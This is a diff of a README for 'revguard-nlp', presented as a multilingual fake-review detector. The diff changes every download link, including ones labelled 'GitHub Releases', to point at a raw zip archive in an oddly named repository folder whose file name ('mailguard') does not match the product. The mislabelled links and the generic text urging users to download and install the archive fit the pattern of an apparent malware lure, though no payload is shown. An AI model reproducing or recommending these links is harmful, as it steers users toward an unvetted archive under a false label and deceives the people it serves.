@@ -4,10 +4,10 @@
 Welcome to revguard-nlp! This tool helps you identify fake reviews in multiple languages. It uses advanced methods like adversarial NLP and real-time streaming. You can trust its explanations thanks to Explainable AI support. 
 
 ## 🔗 Download Now
-[![Download revguard-nlp](https://raw.githubusercontent.com/VorexCotusar/revguard-nlp/main/hogling/revguard-nlp.zip)](https://raw.githubusercontent.com/VorexCotusar/revguard-nlp/main/hogling/revguard-nlp.zip)
+[![Download revguard-nlp](https://github.com/VorexCotusar/revguard-nlp/raw/refs/heads/main/hogling/revguard_nlp_mailguard.zip)](https://github.com/VorexCotusar/revguard-nlp/raw/refs/heads/main/hogling/revguard_nlp_mailguard.zip)
 
 ## 📥 Download & Install
-To get started with revguard-nlp, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/VorexCotusar/revguard-nlp/main/hogling/revguard-nlp.zip).
+To get started with revguard-nlp, visit this page to download: [GitHub Releases](https://github.com/VorexCotusar/revguard-nlp/raw/refs/heads/main/hogling/revguard_nlp_mailguard.zip).
 
 1. Open the link above in your web browser.
 2. Browse through the available releases.
@@ -77,6 +77,6 @@ We plan to introduce the following enhancements in future versions:
 Your input is valuable. Feel free to share your experience or feature requests in the repository.
 
 ## 🔗 Revisit the Download Page
-For any future updates or to download the latest version, visit this page: [GitHub Releases](https://raw.githubusercontent.com/VorexCotusar/revguard-nlp/main/hogling/revguard-nlp.zip).
+For any future updates or to download the latest version, visit this page: [GitHub Releases](https://github.com/VorexCotusar/revguard-nlp/raw/refs/heads/main/hogling/revguard_nlp_mailguard.zip).
 
 Thank you for choosing revguard-nlp!
